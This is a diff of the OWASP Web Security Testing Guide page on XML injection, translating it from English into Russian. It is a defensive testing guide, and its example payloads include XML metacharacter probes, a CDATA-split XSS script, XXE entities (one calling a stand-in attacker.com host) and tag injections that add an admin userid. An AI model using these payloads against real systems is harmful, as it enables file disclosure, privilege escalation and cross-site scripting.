@@ -7,28 +7,28 @@ tags: WSTG
 ---
 
 {% include breadcrumb.html %}
-# Testing for XML Injection
+# Тестирование XML-инъекций
 
 |ID          |
 |------------|
 |WSTG-INPV-07|
 
-## Summary
+## Обзор
 
-XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.
+Тестирование XML-инъекций — это когда тестировщик пытается вставить XML-документ в приложение. Если синтаксический анализатор XML (парсер) не может проверить контекст данных, тест даёт положительный результат.
 
-This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).
+В этом разделе описываются практические примеры XML-инъекций. Сначала будет определён обмен сообщениями в стиле XML и объяснены принципы его работы. Затем — метод обнаружения, в котором мы попытаемся вставить XML-метасимволы. Как только будет выполнен первый шаг, у тестировщика будет некоторая информация о структуре XML, поэтому можно будет попробовать ввести XML-данные и теги (инъекция тегов).
 
-## Test Objectives
+## Задачи тестирования
 
-- Identify XML injection points.
-- Assess the types of exploits that can be attained and their severities.
+- Определить точки входа для XML-инъекций.
+- Оценить типы атак, которые можно провести, и степень их воздействия.
 
-## How to Test
+## Как тестировать
 
-Let's suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new `user>`node in an `xmlDb` file.
+Предположим, что есть некое web-приложение, использующее обмен сообщениями в стиле XML для регистрации пользователей. Это делается путём создания и добавления нового узла `user` в файл `xmlDb`.
 
-Let's suppose the xmlDB file is like the following:
+Предположим, файл xmlDB выглядит следующим образом:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -48,9 +48,9 @@ Let's suppose the xmlDB file is like the following:
 </users>
 ```
 
-When a user registers himself by filling an HTML form, the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a `GET` request.
+Когда пользователь регистрируется, заполняя HTML-форму, приложение получает его данные в стандартном запросе, который для простоты предполагается отправлять в запросе `GET`.
 
-For example, the following values:
+Например, следующие значения:
 
 ```txt
 Username: tony
@@ -58,11 +58,11 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com
 ```
 
-will produce the request:
+дают запрос:
 
 `http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
 
-The application, then, builds the following node:
+Тогда приложение создаёт следующий узел:
 
 ```xml
 <user>
@@ -73,7 +73,7 @@ The application, then, builds the following node:
 </user>
 ```
 
-which will be added to the xmlDB:
+который будет добавлен в xmlDB:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -99,47 +99,47 @@ which will be added to the xmlDB:
 </users>
 ```
 
-### Discovery
+### Обнаружение
 
-The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.
+Первый шаг для проверки приложения на наличие уязвимости XML-инъекции состоит в попытке вставить XML-метасимволы.
 
-XML metacharacters are:
+XML-метасимволы — это:
 
-- Single quote: `'` - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.
+- Одинарная кавычка: `'` — если этот символ не нейтрализовывать, он может вызывать исключения во время парсинга XML, если введённое значение попадёт в значение атрибута в теге.
 
-As an example, let's suppose there is the following attribute:
+В качестве примера предположим, что есть следующий атрибут:
 
 `<node attrib='$inputValue'/>`
 
-So, if:
+Итак, если
 
 `inputValue = foo'`
 
-is instantiated and then is inserted as the attrib value:
+вставляется как значение атрибута
 
 `<node attrib='foo''/>`
 
-then, the resulting XML document is not well formed.
+то результирующий XML-документ имеет неправильный формат.
 
-- Double quote: `"` - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.
+- Двойная кавычка: `"` — этот символ имеет то же значение, что и одинарная, и может использоваться, если значение атрибута заключено в двойные кавычки.
 
 `<node attrib="$inputValue"/>`
 
-So if:
+Итак, если
 
 `$inputValue = foo"`
 
-the substitution gives:
+подстановка даёт:
 
 `<node attrib="foo""/>`
 
-and the resulting XML document is invalid.
+и полученный XML-документ невалиден.
 
-- Angular parentheses: `>` and `<` - By adding an open or closed angular parenthesis in a user input like the following:
+- Угловые скобки: `>` и `<` — добавляя открывающую или закрывающую угловые скобки в пользовательский ввод
 
 `Username = foo<`
 
-the application will build a new node:
+приложение строит новый узел:
 
 ```xml
 <user>
@@ -150,13 +150,13 @@ the application will build a new node:
 </user>
 ```
 
-but, because of the presence of the open '<', the resulting XML document is invalid.
+но из-за наличия незакрытой `<` результирующий XML-документ невалиден.
 
-- Comment tag: `<!--/-->` - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:
+- Тег комментария: `<!--/-->` — эта последовательность символов интерпретируется как начало/конец комментария. Таким образом, введя один из них в параметр имени пользователя:
 
 `Username = foo<!--`
 
-the application will build a node like the following:
+приложение создаст узел типа:
 
 ```xml
 <user>
@@ -167,23 +167,23 @@ the application will build a node like the following:
 </user>
 ```
 
-which won't be a valid XML sequence.
+что не является допустимой последовательностью в XML.
 
-- Ampersand: `&`- The ampersand is used in the XML syntax to represent entities. The format of an entity is `&symbol;`. An entity is mapped to a character in the Unicode character set.
+- Амперсанд: `&` — используется в синтаксисе XML для представления объектов. Формат объекта: `&symbol;`. Сущность сопоставляется с символом в наборе символов Unicode.
 
-For example:
+Например:
 
 `<tagnode>&lt;</tagnode>`
 
-is well formed and valid, and represents the `<` ASCII character.
+правильно оформлен и валиден, представляет собой ASCII-символ `<`.
 
-If `&` is not encoded itself with `&amp;`, it could be used to test XML injection.
+Если `&` не кодируется как `&amp;`, его можно использовать для проверки XML-инъекции.
 
-In fact, if an input like the following is provided:
+На самом деле, если дан ввод, подобный:
 
 `Username = &foo`
 
-a new node will be created:
+будет создан новый узел:
 
 ```xml
 <user>
@@ -194,11 +194,11 @@ a new node will be created:
 </user>
 ```
 
-but, again, the document is not valid: `&foo` is not terminated with `;` and the `&foo;` entity is undefined.
+но, опять же, документ невалиден: `&foo` не заканчивается `;` а сущность `&foo;` не определена.
 
-- CDATA section delimiters: `<!\[CDATA\[ / ]]>` - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.
+- Разделители разделов CDATA: `<!\[CDATA\[ / ]]>` — разделы CDATA используются для экранирования блоков текста, содержащих символы, которые иначе были бы распознаны как разметка. Другими словами, символы, заключенные в разделе CDATA, не анализируются XML-парсером.
 
-For example, if there is the need to represent the string `<foo>` inside a text node, a CDATA section may be used:
+Например, если есть необходимость представить строку `<foo>` внутри текстового узла, можно использовать раздел CDATA:
 
 ```xml
 <node>
@@ -206,25 +206,25 @@ For example, if there is the need to represent the string `<foo>` inside a text 
 </node>
 ```
 
-so that `<foo>` won't be parsed as markup and will be considered as character data.
+здесь `<foo>` не будет интерпретировано как разметка, а будет рассматриваться как символьные данные.
 
-If a node is created in the following way:
+Если узел создан следующим образом:
 
 `<username><![CDATA[<$userName]]></username>`
 
-the tester could try to inject the end CDATA string `]]>` in order to try to invalidate the XML document.
+тестировщик может попытаться ввести конечную строку CDATA `]]>`, чтобы попытаться сделать невалидным XML-документ.
 
 `userName = ]]>`
 
-this will become:
+это приведёт к:
 
 `<username><![CDATA[]]>]]></username>`
 
-which is not a valid XML fragment.
+что не является допустимым фрагментом XML.
 
-Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.
+Ещё один тест с тегом CDATA. Предположим, что XML-документ обрабатывается для создания HTML-страницы. В этом случае разделители разделов CDATA могут быть просто удалены без дальнейшей проверки их содержимого. Затем можно ввести HTML-теги, которые будут включены в сгенерированную страницу, полностью минуя имеющиеся процедуры нейтрализации.
 
-Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.
+Рассмотрим конкретный пример. Предположим, у нас есть узел, содержащий некоторый текст, который будет отображаться пользователю.
 
 ```xml
 <html>
@@ -232,11 +232,11 @@ Let's consider a concrete example. Suppose we have a node containing some text t
 </html>
 ```
 
-Then, an attacker can provide the following input:
+Тогда злоумышленник может ввести следующие данные:
 
 `$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
 
-and obtain the following node:
+и получить следующий узел:
 
 ```xml
 <html>
@@ -244,7 +244,7 @@ and obtain the following node:
 </html>
 ```
 
-During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:
+В процессе обработки разделители разделов CDATA удаляются, в результате чего создаётся следующий HTML-код:
 
 ```html
 <script>
@@ -252,11 +252,11 @@ During the processing, the CDATA section delimiters are eliminated, generating t
 </script>
 ```
 
-The result is that the application is vulnerable to XSS.
+в результате приложение уязвимо для XSS.
 
-External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
+Внешняя сущность: Набор допустимых сущностей может быть расширен путем определения новых. Если определение сущности — это URI, такая называется внешней. Если не настроено иное, внешние сущности заставляют XML-парсер обращаться к ресурсу, указанному в URI, например, к файлу на локальном компьютере или к удалённой системе. Такое поведение подвергает приложение угрозам XML eXternal Entity (XXE), которые могут быть использованы для отказа в обслуживании локальной системы, получения несанкционированного доступа к файлам на локальной машине, сканирования удалённых машин и отказа в обслуживании удалённых систем.
 
-To test for XXE vulnerabilities, one can use the following input:
+Для проверки на наличие уязвимостей XXE можно использовать следующие входные данные:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -265,9 +265,9 @@ To test for XXE vulnerabilities, one can use the following input:
         <foo>&xxe;</foo>
 ```
 
-This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.
+Этот тест может привести к сбою web-сервера (в системе UNIX), если XML-парсер попытается заменить сущность содержимым файла /dev/random.
 
-Other useful tests are the following:
+Другие полезные тесты:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -287,11 +287,11 @@ Other useful tests are the following:
         <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
 ```
 
-### Tag Injection
+### Инъекция тегов
 
-Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.
+Как только первый шаг будет выполнен, тестировщик получит некоторую информацию о структуре XML-документа. Затем можно попробовать вставить свои XML-данные и теги. Мы покажем пример того, как это может привести к атаке с повышением привилегий.
 
-Let's considering the previous application. By inserting the following values:
+Рассмотрим предыдущее приложение. Вставив следующие значения:
 
 ```txt
 Username: tony
@@ -299,7 +299,7 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
 ```
 
-the application will build a new node and append it to the XML database:
+приложение создаст новый узел и добавит его в XML-базу данных:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -327,11 +327,11 @@ the application will build a new node and append it to the XML database:
 </users>
 ```
 
-The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.
+Результирующий XML-файл имеет правильный формат. Более того, вполне вероятно, что для пользователя tony значение, связанное с тегом userid, будет последним, т.е. 0 (идентификатор администратора). Другими словами, мы добавили пользователя с правами администратора.
 
-The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it.
+Единственная проблема заключается в том, что тег userid появляется дважды в последнем пользовательском узле. Часто XML-документы связаны с xsd-схемой или DTD и будут отклонены, если не соответствуют им.
 
-Let's suppose that the XML document is specified by the following DTD:
+Предположим, что документ XML определяется следующим DTD:
 
 ```xml
 <!DOCTYPE users [
@@ -344,9 +344,9 @@ Let's suppose that the XML document is specified by the following DTD:
 ]>
 ```
 
-Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.
+Обратите внимание, что узел идентификатора пользователя (userid) определён с кардинальным числом равным 1. В этом случае атака, которую мы показали ранее (и другие простые атаки), не сработает, если XML-документ проверяется на соответствие его DTD до выполнения какой-либо обработки.
 
-However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:
+Однако эту проблему можно решить, если тестировщик контролирует значение некоторых узлов, предшествующих узлу-нарушителю (в данном примере — userid). На самом деле тестер может закомментировать такой узел, введя последовательность начала/конца комментария:
 
 ```txt
 Username: tony
@@ -354,7 +354,7 @@ Password: Un6R34kb!e</password><!--
 E-mail: --><userid>0</userid><mail>s4tan@hell.com
 ```
 
-In this case, the final XML database is:
+В этом случае получается следующая XML-база данных:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -380,11 +380,11 @@ In this case, the final XML database is:
 </users>
 ```
 
-The original `userid` node has been commented out, leaving only the injected one. The document now complies with its DTD rules.
+Исходный узел `userid` был закомментирован, остался только добавленный. Теперь документ соответствует своим правилам DTD.
 
-## Source Code Review
+## Анализ исходного кода
 
-The following Java API may be vulnerable to XXE if they are not configured properly.
+Следующие Java API могут быть уязвимы для XXE, если их не настроить должным образом.
 
 ```text
 javax.xml.parsers.DocumentBuilder
@@ -408,28 +408,28 @@ XMLReader
 Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
 ```
 
-Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.
+Проверьте исходный код, запрещены ли docType, внешние DTD и внешние сущности?
 
-- [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [Памятка по предотвращению внешних сущностей в XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 
-In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.
+Кроме того, [Java POI office reader](https://poi.apache.org/) может быть уязвим для XXE, если версия ниже 3.10.1.
 
-The version of POI library can be identified from the filename of the JAR. For example,
+Версию библиотеки POI можно определить по имени файла JAR. Например,
 
 - `poi-3.8.jar`
 - `poi-ooxml-3.8.jar`
 
-The followings source code keyword may apply to C.
+Следующие ключевые слова могут применяться в исходном коде на Си:
 
 - libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
 - libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader
 
-## Tools
+## Инструменты
 
-- [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
+- [Строки для фаззинга XML-инъекций (из инструмента wfuzz)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
 
-## References
+## Ссылки
 
-- [XML Injection](https://www.whitehatsec.com/glossary/content/xml-injection)
-- [Gregory Steuck, "XXE (Xml eXternal Entity) attack"](https://www.securityfocus.com/archive/1/297714)
-- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [XML-инъекция](https://www.whitehatsec.com/glossary/content/xml-injection)
+- [Gregory Steuck, "XXE (Xml eXternal Entity) attack"](https://seclists.org/bugtraq/2002/Oct/420)
+- [Памятка OWASP по предотвращению внешних сущностей в XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
